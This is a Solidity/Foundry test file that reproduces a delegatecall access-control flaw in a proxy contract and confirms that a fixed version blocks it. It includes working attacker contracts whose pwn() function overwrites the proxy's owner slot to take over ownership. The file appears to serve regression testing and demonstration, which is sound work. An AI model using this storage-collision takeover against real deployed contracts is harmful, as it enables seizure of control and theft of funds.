// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {AccessControlProxy} from "../src/AccessControlProxy.sol";
import {AccessControlProxyFixed} from "../src/AccessControlProxyFixed.sol";

// Helper used as the delegatecall target. Its storage layout is aligned with the proxy's:
// slot 0 is `owner`, so writing it here writes the proxy's owner slot.
contract AccessControlProxyAttacker {
    address public owner; // slot 0
    function pwn() external {
        owner = msg.sender; // msg.sender is preserved across delegatecall
    }
}

contract AccessControlProxyFixedAttacker {
    address public owner; // slot 0
    function pwn() external {
        owner = msg.sender;
    }
}

contract AccessControlProxyFixtureTest is Test {
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    function _ownerSlot(address a) internal view returns (address) {
        return address(uint160(uint256(vm.load(a, bytes32(uint256(0))))));
    }

    function test_fixtureReproduces() public {
        AccessControlProxy proxy = new AccessControlProxy();
        assertEq(_ownerSlot(address(proxy)), address(this), "owner is deployer");

        AccessControlProxyAttacker evil = new AccessControlProxyAttacker();

        // Anyone may drive the delegatecall; it runs `evil.pwn()` in the proxy's context.
        vm.prank(attacker);
        proxy.forward(address(evil), abi.encodeWithSignature("pwn()"));

        assertEq(_ownerSlot(address(proxy)), attacker, "attacker overwrote the proxy owner slot");
    }

    function test_fixtureDoesNotReproduce() public {
        AccessControlProxyFixed proxy = new AccessControlProxyFixed();
        address ownerBefore = _ownerSlot(address(proxy));
        assertEq(ownerBefore, address(this));

        AccessControlProxyFixedAttacker evil = new AccessControlProxyFixedAttacker();

        vm.prank(attacker);
        vm.expectRevert();
        proxy.forward(address(evil), abi.encodeWithSignature("pwn()"));

        assertEq(_ownerSlot(address(proxy)), ownerBefore, "owner slot unchanged: forward blocked");
    }
}
